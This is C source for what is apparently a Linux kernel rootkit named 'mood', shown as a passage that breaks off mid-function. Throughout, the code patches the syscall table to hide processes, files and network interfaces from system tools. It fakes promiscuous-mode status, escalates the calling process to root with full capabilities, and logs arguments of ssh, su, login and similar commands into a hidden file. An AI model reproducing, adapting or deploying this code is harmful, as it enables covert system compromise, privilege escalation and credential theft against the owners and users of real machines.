/* 
 * Kernel Core, read more infos in README file
 *
 * 
 * Copyright (c) 2006 Pierre Falda <darkangel@antifork.org>
 *      
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */


#include <main.h>
#include <structs.h>
#include <unistd.h>

asm (".globl code_start\n\t" ".globl code_end\n\t");

//static void *dummy=(void*)0x1;
/* hidden tasks bitmap */
static unsigned char 	*pids=(char*)1;
/* sniffed pids bitmsk */
static unsigned char 	*sniffed=(char*)1;
/* original syscalls addresses */
static unsigned int	*o_sct=(void*)1;
/* modified syscalls addresses */
static unsigned int	*fake_sct=(void*)1;
/* shown addresses on redirect */
static unsigned int	*redirs=(void*)1;
/* redirs table for all the syscalls */
static struct redir redirs_table[20]=   {       /* inode - from - to */
                                                { 123456789,"/sbin/init","/sbin/init"LINK_HIJACK_PREFIX HIDE_PREFIX},
						{ 1,"/sbin/init","/sbin/init (deleted)"},
                                        };
static struct net **net_tables=(struct net**)0x1;

/* inode numbers for /proc kcore tcp udp raw unix */
static unsigned long proc_inos[6]={1};
/* major/minor for /dev/ kmem mem */
static unsigned char dev_mmn[2][2]={{1,1}};
/* proc net names */
static char *proc_names[]={"/proc/kcore","/proc/net/udp","/proc/net/raw","/proc/net/unix"};
/* log argv ot these processes */
static char *sniff_commands[]={"ssh","login","telnet","ftp","scp","su"};
/* evil names, memorize their major/minor to activate redirections */
static char *dev_names[]={"/dev/kmem","/dev/mem"};
/* we need it for current, this is the default value */
static unsigned long thread_size=4096;
/* used for arcane magic feature */
static unsigned long do_debug=1,magic_addr=1,magic_rejoin=1,magic_ptrace_addr=1,magic_ptrace_rejoin=1,pentium=1,kstart=1,kend=1,magic_vaddr=1,magic_vrejoin=1,
register_die_stubaddr=1,virtual=1;
/* we can hide extra 4096 inodes */
static unsigned long *free_inodes=(unsigned long*)1;
/* rember died processes and free their slot in our pids array */
static unsigned long dead_memory[80]={1};
/* we can hide up to 20 network interfaces */
static struct iface interfaces[20]= {{"",1,1}};
/* various offsets in task_struct */
static long comm=1,pidoff=1,group=1,capoff=1;
/* address of int80 */
static unsigned long int80=1;
/* did we already modifyed init comms or should we stop our engine? */
static int check=1,shouldstop=1;
/* device of procfs */
static unsigned long proc_dev=1;
/* addr of sct */
static unsigned long sys_call_table=1;
/* our allocation address */
static unsigned long my_memory=1;
/* authorization key */
static unsigned long auth_key=KEY;
/* address of vmalloc */
static unsigned long vmaddr=1,scf_addr=1;	
static char *(*vmalloc)()=(void*)1;
static int  (*getmypid)(void)=(void*)1;
static int  (*printk)()=(void*)1;
static void (*smp_call_function)()=(void*)1;
static int  (*register_die_notifier)(struct notifier_block *nb)=(void*)1;
inline unsigned long set_dr7_lglobal(int,unsigned long);
inline unsigned long set_dr7_size(int,unsigned long,unsigned int);
inline unsigned long set_dr7_type(int,unsigned long,unsigned int);

static struct notifier_block mood_debug_handler =
{
      .priority = 0x80000000 
};

/* mood working mode */
static int mood_mode=1;
extern int	mood_exceptions_stub();
extern int	new_execve();
extern int	new_syscall();
extern int	new_vsyscall();
extern int	new_systrace();
inline int	check_path(char*);
static unsigned char jumpcode[7]="\xb9\x00\x00\x00\x00\xff\xe1";
static unsigned char backupcode[7]="\x01\x01\x01\x01\x01\x01\x01";

static unsigned char debug_jumpcode[7]="\xb9\x00\x00\x00\x00\xff\xe1";
static unsigned char debug_backupcode[7]="\x01\x01\x01\x01\x01\x01\x01";

#define should_hide_proc_inode(x)	((x>2)&&((x-2)%65536==0)&&is_hided((x-2)/65536))
#define should_hide_name(x)             ((strstr(x,HIDE_PREFIX)!=NULL)?1:0)
#define SYS(x,args...)			(( int(*)())o_sct[__NR_##x])(args)
#define true_behaviour			is_hided(curpid())
#define MAJOR(x)        		((x&0x0000ff00)>>8)
#define MINOR(x)        		(x&0x000000ff)
#define ALIGN4K(x)      		((x+4095) & ~4095)
#define HOOK(table,name)		table[__NR_##name]=new_##name
#define IS_24(x)			(((long)x>=0)&&((long)x<=32))
#define IS_26(x)                        (!(((long)x>=0)&&((long)x<=32)))
#define IFACE_NAME(ptr)			((struct ifreq*)ptr)->ifr_ifrn.ifrn_name
#define isprint(a) 			((a >=' ')&&( a<= '~'))
#define MEMIZE(x)			(x&0x00ffffff)
#define KCORIZE(x)			(MEMIZE(x)+0x1000)

inline void m_memcpy(unsigned char *to,unsigned char *from,unsigned long size)
{
	register unsigned long i;
	for(i=0;i<size;i++)
		*to++=*from++;
}
inline int m_strlen(char *str)
{
	register int len=0;
	while(*str!='\0')
	{
		len++;
		str++;
	}
	return len;
}

static unsigned char *m_memmem(unsigned char *haystack, unsigned int h_size,unsigned char *needle,
		      unsigned int n_size)
{
	register unsigned long i,j;
	for(i=0;i<h_size;i++)
	<%
		if(j==n_size)
			return haystack+i-1;
		for(j=0;j<n_size;j++)
			if(*(haystack+i+j)!=*(needle+j))
				break;
	%>
	return NULL;
}
static inline unsigned long
pcheck()
{
 /* XXX Tnx rookie! :) */

	register unsigned res;
        __asm__ __volatile__ (
                                "pushfl\n\r"
                                "popl   %%eax\n\r"
                                "movl   %%eax,%%ecx\n\r"
                                "xorl   $0x200000,%%eax\n\r"
                                "pushl  %%eax\n\r"
                                "popfl\n\r"
                                "pushfl\n\r"
                                "popl   %%edx\n\r"
                                "xorl   %%eax,%%eax\n\r"
                                "cmpl   %%edx,%%ecx\n\r"
                                "je     1f\n\r"
                                "movl   $0x01,%%eax\n\r"
                                "cpuid\n\r"
                                "movb   %%dl,%%al\n\r"
                                "andl   $0x02,%%eax\n\r"
				"movl 	%%eax,%0\n\r"
                                "1:\n\r":"=g"(res));
	return res;

}

static inline int reg_register_die_notifier(struct notifier_block *nb)
<%
register int ret;
asm __volatile__ (
			"mov %0, %%eax\n\r"
			"call *register_die_stubaddr\n\r"
			: "=g"(ret) 
			: "0"(nb)
		 );
return ret;
%>



static inline char *vmalloc6(unsigned long size)
{

	return ((char*(*)())vmaddr)(size);
}

static inline char *vmalloc4(unsigned long size)
{
	return ((char*(*)())vmaddr)(size,GFP_KERNEL4|__GFP_HIGHMEM,__PAGE_KERNEL);
}

inline int is_user_promisc(struct ifreq *ptr)
{
	int i;
	for(i=0;i<(sizeof(interfaces)/sizeof(interfaces[0]));i++)
	{
		if(interfaces[i].name[0]==0)
		{
			m_memcpy(interfaces[i].name,IFACE_NAME(ptr),m_strlen(IFACE_NAME(ptr)));
			return 0;
		}
		if(!strncmp(IFACE_NAME(ptr),interfaces[i].name,IF_NAMESIZE))
			return (int)interfaces[i].user;
	}	

}

inline int is_fake_promisc(struct ifreq *ptr)
{
	int i;
	for(i=0;i<sizeof(interfaces)/sizeof(interfaces[0]);i++)
	{
		if(interfaces[i].name[0]==0)
		{
			m_memcpy(interfaces[i].name,IFACE_NAME(ptr),m_strlen(IFACE_NAME(ptr)));
			return 0;
		}
		if(!strncmp(IFACE_NAME(ptr),interfaces[i].name,IF_NAMESIZE))
			return (int)interfaces[i].real;
	}	

}

inline fake_promisc(struct ifreq *ptr,int value)
{
        int i;
        for(i=0;i<sizeof(interfaces)/sizeof(interfaces[0]);i++)
        {
                if(interfaces[i].name[0]==0)
                {
                        m_memcpy(interfaces[i].name,IFACE_NAME(ptr),m_strlen(IFACE_NAME(ptr)));
                        interfaces[i].real=(char)value;
                        return;
                }
                if(!strncmp(IFACE_NAME(ptr),interfaces[i].name,IF_NAMESIZE))
                {
                        interfaces[i].real=(char)value;
                        return;
                }
        }

}
inline void user_promisc(struct ifreq *ptr,int value)
{
	int i;
	for(i=0;i<sizeof(interfaces)/sizeof(interfaces[0]);i++)
	{
		if(interfaces[i].name[0]==0)
		{
			m_memcpy(interfaces[i].name,IFACE_NAME(ptr),m_strlen(IFACE_NAME(ptr)));
			interfaces[i].user=(char)value;
			return;
		}
		if(!strncmp(IFACE_NAME(ptr),interfaces[i].name,IF_NAMESIZE))
		{
			interfaces[i].user=(char)value;
			return;
		}
	}	

}

inline void set_fake_promisc(struct ifreq *ptr)
{
	fake_promisc(ptr,1);
}
inline void unset_fake_promisc(struct ifreq *ptr)
{
	fake_promisc(ptr,0);
}
inline void set_user_promisc(struct ifreq *ptr)
{
	user_promisc(ptr,1);
}
inline void unset_user_promisc(struct ifreq *ptr)
{
	user_promisc(ptr,0);
}

static void print_banner(char *name,char *banner)
{
	if(!printk)
		return;
	printk(banner,name);
}
inline void print_fake_unset_banner(char *name)
{
	print_banner(name,"device %s left promiscuous mode\n");
}
inline void print_fake_set_banner(char *name)
{
        print_banner(name,"device %s entered promiscuous mode\n");
}

inline void set_printk(void)
{
	if(printk)
		m_memcpy((void*)printk,backupcode,7);
}
inline void reset_printk(void)
{
	if(printk)
		m_memcpy((void*)printk,jumpcode,7);
}
static inline union task *current(void)
{
	union task *t;
	__asm__("andl %%esp,%0; ":"=r" (t) : "0" (~(thread_size - 1)));
	return t;
}

inline char *get_task(void)
{
	union task *curr=current();
	if(IS_26(curr->ts.state))
		return (char*)curr->ti.task;
	return (char*)curr;

}
inline long get_limit(void)
{
	union task *curr=current();
        if(IS_26(curr->ts.state))
           return curr->ti.addr_limit; /* 2.6 */
        return curr->ts.addr_limit; /* 2.4 */      
}

inline void set_limit(long limit)
{
	union task *curr=current();
	if(IS_26(curr->ts.state))
		curr->ti.addr_limit=limit;
	else
		curr->ts.addr_limit=limit;
}

void *ualloc(unsigned long size)
{
	struct mmaparg arg;
	long limit;
	unsigned long ret=0;
	arg.addr=0;
	arg.len=ALIGN4K(size+4);
        arg.prot = PROT_RWX;
        arg.flags = MAP_PRIVATE;
        arg.fd = 0;
        arg.offset = 0;
	limit=get_limit();
	set_limit(KERNEL_DS);
	ret=SYS(mmap,&arg);
	set_limit(limit);
	if(((long)ret)==-1)
		return NULL;
	*((unsigned long*)ret)=arg.len;
	return (void*)(ret+4);	

}
static inline int getpid6(void)
{
	return SYS(gettid);
}
static inline int getpid4(void)
{
	int i;
	char *task=get_task();
	int pgrp,session,tgid;
	if(pidoff>0)
		return *((int*)(task+pidoff));
	pgrp=SYS(getpgrp),session=SYS(getsid,0),tgid=SYS(getpid);
	for(i=0;i<900;i++)
		if((*(ulong*)(task+i)==pgrp)&&(*(ulong*)(task+i+8)==session)&&(*(ulong*)(task+i+12)==tgid))
			return *(ulong*)(task+i-4);
	return -1;
}

static inline int get_pidoff(void)
{
	int i;
	char *task=get_task();
	int pgrp,session,tgid;
	pgrp=SYS(getpgrp),session=SYS(getsid,0),tgid=SYS(getpid);
	for(i=0;i<900;i++)
		if((*(ulong*)(task+i)==pgrp)&&(*(ulong*)(task+i+8)==session)&&(*(ulong*)(task+i+12)==tgid))
			return i-4;
	return -1;

}
static inline int curpid(void)
{
	int pid=getmypid();
	if((pid<0)||(pid>PID_MAX))
	{	
		return SYS(getpid);
	}
	return pid;
}

void ufree(void *memory)
{
	if (memory) 
		SYS(munmap, ((unsigned long*)memory)-1, ((unsigned long*)memory)[-1]);

}

inline void hide(unsigned int pid)
{
	if(pid>PID_MAX)
		return;
	pids[pid/8] |= 1<<(pid%8);
}

inline void unhide(unsigned int pid)
{
	if(pid>PID_MAX)
		return;
	pids[pid/8] &= ~(1<<(pid%8));
}

inline int is_hided(unsigned int pid)
{
	if(pid>PID_MAX)
		return 0;
	return pids[pid/8] & 1<<(pid%8);
}
inline void sniff(unsigned int pid)
{
        if(pid>PID_MAX)
                return;
        sniffed[pid/8] |= 1<<(pid%8);
}

inline void unsniff(unsigned int pid)
{
        if(pid>PID_MAX)
                return;
        sniffed[pid/8] &= ~(1<<(pid%8));
}

inline int is_sniffed(unsigned int pid)
{
        if(pid>PID_MAX)
                return 0;
        return sniffed[pid/8] & 1<<(pid%8);
}

inline int should_redir(unsigned long inode)
{
        int i;
        for(i=0;i<sizeof(redirs_table)/sizeof(redirs_table[0]);i++)
                if(redirs_table[i].inode==inode)
                        return i;
        return -1;

}

inline int should_hide_inode(unsigned long inode)
{
	register int i;
	
	for(i=0;i<F_INODES;i++)
		if(free_inodes[i]==inode)
			return 1;
	return 0;
}

inline int hide_inode(unsigned long inode)
{
	register int i;
	for(i=0;i<F_INODES;i++)
		if(!free_inodes[i])
		{
			free_inodes[i]=inode;
			return 0;
		}
	return -1;
}

inline int unhide_inode(unsigned long inode)
{
	register int i;
	for(i=0;i<F_INODES;i++)
		if(free_inodes[i]==inode)
		{
			free_inodes[i]=0;
			return 0;
		}
	return -1;
}

inline char *skip_blank(char *src)
{
	while((*src==' ')||(*src=='\t'))
		src++;
	return src;
}
inline char *skip_char(char *src)
{
	while((*src!=' ')&&(*src!='\t')&&(*src!='\0'))
		src++;
	return src;
}
static int m_atoi(const char *str)
{
       int ret = 0, mul = 1;
       const char *ptr;
       str=skip_blank(str);
       for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++);
       ptr--;
       while (ptr >= str) {
             if (*ptr < '0' || *ptr > '9')
                      break;
             ret += (*ptr - '0') * mul;
             mul *= 10;
            ptr--;
       }
       return ret;
}

inline void *m_memmove(void *dst, void *src, unsigned long count)
{
  char *a = dst;
  char *b = src;
  if (src!=dst)
  {
    if (src>dst)
    {
      while (count--) *a++ = *b++;
    }
    else
    {
      a+=count-1;
      b+=count-1;
      while (count--) *a-- = *b--;
    }
  }
  return dst;
}
 
static int __ltostr(char *s, unsigned int size, unsigned long i, unsigned int base, int UpCase)
{
  char *tmp;
  unsigned int j=0;

  s[--size]=0;

  tmp=s+size;

  if ((base==0)||(base>36)) base=10;

  j=0;
  if (!i)
  {
    *(--tmp)='0';
    j=1;
  }

  while((tmp>s)&&(i))
  {
    tmp--;
    if ((*tmp=i%base+'0')>'9') *tmp+=(UpCase?'A':'a')-'9'-1;
    i=i/base;
    j++;
  }
  m_memmove(s,tmp,j+1);

  return j;
}

inline char *m_itoa(char *buf,int i,int size)
{
	__ltostr(buf,size,i,10,0);
	return buf;
}

inline void m_memset(unsigned char *to, unsigned char data,unsigned long size)
{
	register unsigned long i;
	for(i=0;i<size;i++)
		*to++=data;

}

inline void d_reactivate(void)
{
	m_memcpy((char*)sys_call_table+4,&fake_sct[1],((NR_syscalls-1)*sizeof(void*)));

}

inline void unset(void)
{
	 m_memcpy((char*)sys_call_table+4,&o_sct[1],((NR_syscalls-1)*sizeof(void*)));
}

inline int strncmp(const char * cs,const char * ct,unsigned int count)
{
        register int __res;
        int d0, d1, d2;
        __asm__ __volatile__(   "1:\tdecl %3\n\t"
                                "js 2f\n\t"
                                "lodsb\n\t"
                                "scasb\n\t"
                                "jne 3f\n\t"
                                "testb %%al,%%al\n\t"
                                "jne 1b\n"
                                "2:\txorl %%eax,%%eax\n\t"
                                "jmp 4f\n"
                                "3:\tsbbl %%eax,%%eax\n\t"
                                "orb $1,%%al\n"
                                "4:"
                                        :"=a" (__res), "=&S" (d0), "=&D" (d1), "=&c" (d2)
                                        :"1" (cs),"2" (ct),"3" (count)
                            );
        return __res;
}

inline char * m_strchr(const char * s, int c)
{
        for(; *s != (char) c; ++s)
               if (*s == '\0')
                      return NULL;
        return (char *) s;
}
inline char * m_strrchr(char * s, int c)
{
	char *start=s,*prev=NULL;
	if(!s)
		return NULL;
	do
	{
		start=m_strchr(start,c);
		if(!((start==NULL)&&(prev!=NULL)))
			prev=start;
		if(start)
			start++;
	}
	while(start);
	return prev;
	
	
}
inline char *
strstr (const char *__haystack, const char *__needle)
{
  register unsigned long int __d0, __d1, __d2;
  register char *__res;
  __asm__ __volatile__
    ("pushl     %%ebx\n\t"
     "cld\n\t" \
     "movl      %4,%%edi\n\t"
     "repne; scasb\n\t"
     "notl      %%ecx\n\t"
     "decl      %%ecx\n\t"      /* NOTE! This also sets Z if searchstring='' */
     "movl      %%ecx,%%ebx\n"
     "1:\n\t"
     "movl      %4,%%edi\n\t"
     "movl      %%esi,%%eax\n\t"
     "movl      %%ebx,%%ecx\n\t"
     "repe; cmpsb\n\t"
     "je        2f\n\t"         /* also works for empty string, see above */
     "xchgl     %%eax,%%esi\n\t"
     "incl      %%esi\n\t"
     "cmpb      $0,-1(%%eax)\n\t"
     "jne       1b\n\t"
     "xorl      %%eax,%%eax\n\t"
     "2:\n\t"
     "popl      %%ebx"
     : "=&a" (__res), "=&c" (__d0), "=&S" (__d1), "=&D" (__d2)
     : "r" (__needle), "0" (0), "1" (0xffffffff), "2" (__haystack)
     : "cc");
  return __res;
}
static inline char *limit_strstr(char *data,char *pattern, int size)
{
	char *tmp=data,*ptr=pattern;
	while(*tmp&&(tmp<=(data+size)))
	{
		if(*tmp==*ptr)
			ptr++;
		else
			ptr=pattern;
		if(*ptr=='\0')
			return tmp-m_strlen(pattern)+1;
		tmp++;
	}
	return NULL;
		
}
static inline int is_a_tty(int fd)
{
	long i=0,limit,ret;
	limit=get_limit();
	set_limit(KERNEL_DS);
	ret=SYS(ioctl,fd,TIOCGPGRP,&i);
	set_limit(limit);
	return (ret<0?0:1);
 
}

inline void strcat(char *dest,char *src)
{
	m_memcpy(dest+m_strlen(dest),src,m_strlen(src));
}

static inline int check_path(char *name)
{
	static unsigned char buffer[257]={1};
	unsigned char *from, *to;
	struct stat64 statme;
	unsigned long limit=get_limit();
	long ret;
	if(!name)
		return 0;
	from=name;
	to=buffer;
        set_limit(KERNEL_DS);
	while(*from!='\0')
	{
		*to++=*from++;
		*to='\0';
		if(*(char*)(to-1)=='/')
		{
		       m_memset(&statme,'\0',sizeof(statme));
	               ret=SYS(stat64,buffer,&statme);
		       if(ret<0)
				goto retzero;
		       if(should_hide_proc_inode(statme.__st_ino)||
			   should_hide_name(buffer)||should_hide_inode(statme.__st_ino))
				goto retone;

		}
	}
	*to++=*from++;
        if(SYS(stat64,buffer,&statme)<0)
		goto retzero;
        if(should_hide_proc_inode(statme.__st_ino)||should_hide_name(buffer))
  		goto retone;
retzero:

	set_limit(limit);
	return 0;
retone:

	set_limit(limit);
	return 1;
}

inline int should_hide(unsigned long inode, char *name)
{
	if(should_hide_proc_inode(inode)||should_hide_name(name)||check_path(name)||should_hide_inode(inode))
		return 1;

	return 0;
}

static int old_get_root(void)
{
	unsigned int uid=SYS(getuid),gid=SYS(getgid),euid=SYS(geteuid),egid=gid=SYS(getegid);
	char *task=get_task();
	int i;
	for(i=0;i<700;i++)
	{
		if ((*(unsigned int*)(task+i)==uid) && (*(unsigned int*)(task+i+4)==euid) &&
		   (*(unsigned int*)(task+i+16)==gid) && (*(unsigned int*)(task+i+20)==egid))
		{
			*(unsigned int*)(task+i)=0;
			*(unsigned int*)(task+i+4)=0;
			*(unsigned int*)(task+i+16)=0;
			*(unsigned int*)(task+i+20)=0;
			return i;
		}
	}
	return 0;
}
static void old_set_comm(char *pattern,char *setto)
{
	int i;
	char *task=get_task();
	for(i=0;i<800;i++)
	{
		if(!strncmp(task+i,pattern,15))
		{
			m_memcpy(task+i,setto,m_strlen(setto)>15?16:m_strlen(setto)+1);
			return;
		}

	}

}

static int get_comm_off(char *name)
{
	int i;
	char *task=get_task();
	for(i=0;i<1200;i++)
		if(!strncmp(task+i,name,15))
			return i;
	return -1;
}

static inline void set_comm(char *pattern,char *setto)
{
	char *task=get_task();
	if(comm>0)
		m_memcpy(task+comm,setto,m_strlen(setto)>15?16:m_strlen(setto)+1);
	else
		old_set_comm(pattern,setto);
		
}
static int set_caps(long offset, unsigned char *task,ulong *caps)
{
	cap_header head={0x19980330,curpid()};
	cap_data   data={0,0,0};
	ulong *scout,backup;
	long i;
        for(i=offset;i<1200;i++)
        {
            scout=(ulong *)((ulong)task+i);
            backup=*scout;
            *scout=0xbadc0ded;
            if(SYS(capget,&head,&data)>=0)
            {
                   if(data.effective==*scout)
                   {
                           /* caps found */
                           *scout++=caps[0];
                           *scout++=caps[1];
                           *scout++=caps[2];
			   return i;
                    }
                    else
                           *scout=backup;
            }
            else
                   *scout=backup;

        }
	return 0;	
}
static inline void get_root(void)
{
	unsigned char *task=get_task();
	long limit=get_limit();
	ulong caps[]={~0,~0,~0};
	int gr_ret;
	ulong *cap;
	gr_ret=old_get_root();
	if(capoff!=0)
	{
		cap=(ulong *)((ulong)task+capoff);
		*cap++=~0;
		*cap++=~0;
		*cap++=~0;
	}
	else
		set_caps(gr_ret,task,caps);

        SYS(setresuid,0,0,0);
        SYS(setresgid,0,0,0);
	set_limit(KERNEL_DS);
        SYS(setgroups,1,&group);
	set_limit(limit);
											 
}

static inline char *get_comm(void)
{
	char *task=get_task();
	if(comm>0)
		return task+comm;
	return NULL;
				
}

static inline int should_sniff_argv(char *name)
{
	int i;
	for(i=0;i<sizeof(sniff_commands)/sizeof(sniff_commands[0]);i++)
		if(!strncmp(name,sniff_commands[i],15))
			return 1;
	return 0;
}
static void log_sniffed(void *data, int lenght)
{
	int fd,umask;
	long limit=get_limit();
	set_limit(KERNEL_DS);
	umask=SYS(umask, 0);
	fd = SYS(open, OUR_DIR"/"SNIFF_FILE, O_APPEND | O_WRONLY | O_CREAT, 0222);
	SYS(umask, umask);
	if(fd<0)
		goto exit;
	SYS(write,fd,data,lenght);
	SYS(close,fd);
exit:
	set_limit(limit);
}

static inline unsigned long read_dr(int regnum)
{
       unsigned long val = 0;
       switch (regnum) {
               case 0: get_dr(0, val); break;
               case 1: get_dr(1, val); break;
               case 2: get_dr(2, val); break;
               case 3: get_dr(3, val); break;
               case 6: get_dr(6, val); break;
               case 7: get_dr(7, val); break;
       }
       return val;
}
static inline void write_dr(int regnum, unsigned long val)
{
       switch (regnum) {
               case 0: set_dr(0, val); break;
               case 1: set_dr(1, val); break;
               case 2: set_dr(2, val); break;
               case 3: set_dr(3, val); break;
               case 7: set_dr(7, val); break;
       }
       return;
}
static void smp_write_dr(struct dr_action volatile * volatile arg)
{
	write_dr(arg->reg,arg->addr);
}
static inline int dr_trap(unsigned int condition)
{
       int i, reg_shift = 1UL;
       for (i = 0; i < DR_MAX; i++, reg_shift <<= 1)
               if (condition & reg_shift)
                       return i;
       return -1;
}
static inline unsigned long dr_trap_addr(unsigned int condition)
{
       int regnum = dr_trap(condition);
       if (regnum == -1)
               return -1;
       return read_dr(regnum);
}


static inline void deactivate_magic(int regnum)
{
	struct dr_action arg;
	unsigned long dr7=read_dr(7);
	RESET_DR7(dr7, regnum);
	dr7&=~DR_PROTECT;
	arg.reg=7;
	arg.addr=dr7;
	if(smp_call_function>kstart)
                smp_call_function(smp_write_dr,&arg,0,0);
	write_dr(7, dr7);

}
static void activate_magic(ulong,int,int,int);
#define template_stat(name)						\
	int new_##name(char *file,void *buf)				\
	{								\
		struct stat64 statme;					\
		unsigned long limit;					\
		long ret;						\
		if(true_behaviour)					\
			goto ok;					\
		limit=get_limit();					\
		set_limit(KERNEL_DS);					\
		m_memset(&statme,'\0',sizeof(statme));			\
		ret=SYS(stat64,file,&statme);				\
		set_limit(limit);					\
		if(ret<0)						\
			goto ok;		 			\
		if(should_hide(statme.__st_ino,file))			\
		{							\
			return -ENOENT;					\
		}							\
                ret=should_redir(statme.__st_ino);                      \
                if((ret!=-1))                                           \
                {                                                       \
                        set_limit(KERNEL_DS);                           \
                        ret= SYS(name,redirs_table[ret].to,buf);        \
                        set_limit(limit);                               \
                        return ret;                                     \
                }                                                       \
ok:									\
		return SYS(name,file,buf);				\
	}

#define template_statfs(name)						\
	int new_##name(char *file,ulong size,void *buf)			\
	{								\
		struct stat64 statme;					\
		unsigned long limit;					\
		long ret;						\
		if(true_behaviour)					\
			goto ok;					\
		limit=get_limit();					\
		set_limit(KERNEL_DS);					\
		m_memset(&statme,'\0',sizeof(statme));			\
		ret=SYS(stat64,file,&statme);				\
		set_limit(limit);					\
		if(ret<0)						\
			goto ok;		 			\
		if(should_hide(statme.__st_ino,file))			\
		{							\
			return -ENOENT;					\
		}							\
                ret=should_redir(statme.__st_ino);                      \
                if((ret!=-1))                                           \
                {                                                       \
                        set_limit(KERNEL_DS);                           \
                        ret= SYS(name,redirs_table[ret].to,buf);        \
                        set_limit(limit);                               \
                        return ret;                                     \
                }                                                       \
ok:									\
		return SYS(name,file,size,buf);				\
	}


#define template_kill(name)						\
	int new_##name(int pid,int sig)					\
	{								\
		if(true_behaviour)					\
			return  SYS(name,pid,sig);			\
		if(is_hided(pid))					\
			return -ESRCH;					\
		return SYS(name,pid,sig);				\
	}
			
#define template_tgkill(name)						\
	int new_##name(int tgid,int pid,int sig)			\
	{								\
		if(true_behaviour)					\
			return  SYS(name,tgid,pid,sig);			\
		if(is_hided(pid))					\
			return -ESRCH;					\
		return SYS(name,tgid,pid,sig);				\
	}


#define template_rt_sigqueueinfo(name)					\
	int new_##name(int pid,int sig,void *boh)			\
	{								\
		if(true_behaviour)					\
			return  SYS(name,pid,sig,boh);			\
		if(is_hided(pid))					\
			return -ESRCH;					\
		return SYS(name,pid,sig,boh);				\
	}

#define template_getdents(name,struct_type)				\
	int new_##name(int fd, struct struct_type *dirp, int count)	\
	{								\
		struct struct_type *dir,*ptr,*tmp,*prev=NULL;		\
		long i,rec=0,ret=SYS(name,fd,dirp,count);		\
		if((ret<=0)||true_behaviour)				\
			return ret;					\
		tmp=(struct struct_type*)ualloc(ret);			\
		if(!tmp)						\
			return ret;					\
		m_memcpy(tmp,dirp,ret);					\
		ptr=dir=tmp;						\
		i=ret;							\
		while ((ulong) dir < ((ulong) tmp + i))			\
		{							\
		 	rec=dir->d_reclen;				\
			if(should_hide(dir->d_ino,dir->d_name))		\
			{						\
				 if (!prev) {				\
				    ret-=rec;				\
				    ptr=(struct struct_type*)		\
					 ((ulong) dir +rec);		\
				 }					\
				 else					\
				 {					\
				     prev->d_reclen += rec;		\
				     m_memset(dir, '\0', rec);		\
				 }					\
			}						\
			else						\
				prev = dir;				\
			dir=(struct struct_type*)((ulong)dir+rec);	\
		}							\
		m_memcpy(dirp,ptr,ret);					\
		ufree(tmp);						\
		return ret;						\
	}
		
#define template_fork(name)						\
	int new_##name(struct pt_regs regs)				\
	{								\
		ulong pid;						\
		if(is_hided(SYS(getppid)))				\
			hide(curpid());					\
		pid=SYS(name,regs);					\
		if(pid>0)						\
		{							\
			if(true_behaviour)				\
			{						\
				hide(pid);				\
			}						\
		}							\
		if(pid==0)						\
		{							\
			if(is_hided(SYS(getppid)))			\
			{						\
				hide(curpid());				\
			}						\
		}							\
		return pid;						\
	}

#define template_chdir(name)						\
	int new_##name(char *file)					\
	{								\
		struct stat64	statme;					\
		long limit,ret;						\
		if(true_behaviour)					\
			goto ok;					\
		m_memset(&statme,'\0',sizeof(statme));			\
		limit=get_limit();					\
		set_limit(KERNEL_DS);					\
		ret=SYS(stat64,file,&statme);				\
		set_limit(limit);					\
		if(ret<0)						\
			goto ok;		 			\
		if(should_hide(statme.__st_ino,file))			\
			return -ENOENT;					\
ok:									\
		return  SYS(name,file);					\
	}

#define template_chmod(name)						\
	int new_##name(char *file,short mode)				\
	{								\
		struct stat64 statme;                                 	\
		long limit,ret;						\
		if(true_behaviour)                                      \
			goto ok;					\
		m_memset(&statme,'\0',sizeof(statme));                  \
		limit=get_limit();					\
		set_limit(KERNEL_DS);					\
		ret=SYS(stat64,file,&statme);	                        \
		set_limit(limit);					\
		if(ret<0)						\
			goto ok;                                        \
		if(should_hide(statme.__st_ino,file))			\
			return -ENOENT;					\
ok:             return  SYS(name,file,mode);                            \
	}
	
#define template_chown(name)                                            \
	int new_##name(char *file,short uid,short gid)                  \
	{								\
		struct stat64 statme;                                   \
		long limit,ret;						\
		if(true_behaviour)                                      \
			goto ok;                                        \
		m_memset(&statme,'\0',sizeof(statme));                  \
		limit=get_limit();					\
		set_limit(KERNEL_DS);					\
		ret=SYS(stat64,file,&statme);	                        \
		set_limit(limit);					\
		if(ret<0)						\
			goto ok;                                        \
		set_limit(limit);					\
		if(should_hide(statme.__st_ino,file))			\
			return -ENOENT;					\
ok:             return  SYS(name,file,uid,gid);                         \
	}

static int template_mmap_check(unsigned long value,unsigned long offset,unsigned long size,unsigned long mon_size,unsigned long buffer,unsigned long orig)
{
		if(value==0xdeadbeef) /* magic to avoid check */
			return 0;
		if(value&&(offset>=value)&&(offset<=(value+mon_size)))
		{
			if((offset+size)<=(value+mon_size))
			{
				m_memcpy(buffer,(unsigned char*)orig+offset-value,size);
				return 1;
			}
			else if(value&&((offset+size)>(value+mon_size)))
			{
				m_memcpy(buffer,(unsigned char*)orig+(offset-value),size-(offset+size-(value+mon_size)));
				return 1;
			}
		}
		else if (value && (offset<value) && ((offset+size) > value))
		{
			int start_fake=value-offset;
